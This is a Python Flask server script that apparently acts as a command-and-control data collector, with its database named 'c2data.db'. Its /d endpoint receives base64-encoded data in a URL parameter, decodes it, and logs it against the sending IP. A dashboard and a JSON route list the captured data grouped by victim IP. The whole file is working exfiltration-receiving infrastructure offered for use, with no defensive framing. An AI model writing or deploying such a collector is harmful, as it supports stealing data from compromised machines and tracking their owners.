from flask import Flask, request, jsonify, render_template_string
import sqlite3
import base64
import datetime

app = Flask(__name__)
DB_PATH = 'c2data.db'

# HTML content from your Canvas document
with open('dashboard.html', 'r') as f:
    HTML_TEMPLATE = f.read()

import base64

def safe_b64decode(b64_data):
    # Add padding if necessary
    missing_padding = len(b64_data) % 4
    if missing_padding:
        b64_data += '=' * (4 - missing_padding)
    return base64.b64decode(b64_data).decode(errors="ignore")


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            data TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT id, ip, data, timestamp FROM logs ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    logs_by_ip = {}
    for entry_id, ip, data, timestamp in rows:
        logs_by_ip.setdefault(ip, []).append({
            'id': entry_id,
            'data': data,
            'timestamp': timestamp
        })

    return render_template_string(HTML_TEMPLATE, logs=logs_by_ip)


@app.route('/d', methods=['GET'])
def get_data():
    b64_data = request.args.get('data')
    src_ip = request.remote_addr
    if b64_data:
        decoded_data = safe_b64decode(b64_data)
        timestamp = datetime.datetime.utcnow().isoformat()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        print((src_ip, decoded_data, timestamp))
        c.execute('INSERT INTO logs (ip, data, timestamp) VALUES (?, ?, ?)', (src_ip, decoded_data, timestamp))
        conn.commit()
        conn.close()
        return 'OK'

    # No ?data= means return JSON
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT id, ip, data, timestamp FROM logs ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    result = {}
    for entry_id, ip, data, timestamp in rows:
        result.setdefault(ip, []).append({
            'id': entry_id,
            'data': data,
            'timestamp': timestamp
        })

    return jsonify(result)

@app.route('/delete', methods=['POST'])
def delete_entry():
    entry_id = request.args.get('id')
    if not entry_id or not entry_id.isdigit():
        return 'Invalid ID', 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM logs WHERE id=?', (entry_id,))
    conn.commit()
    conn.close()
    return 'Deleted', 200

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8080)
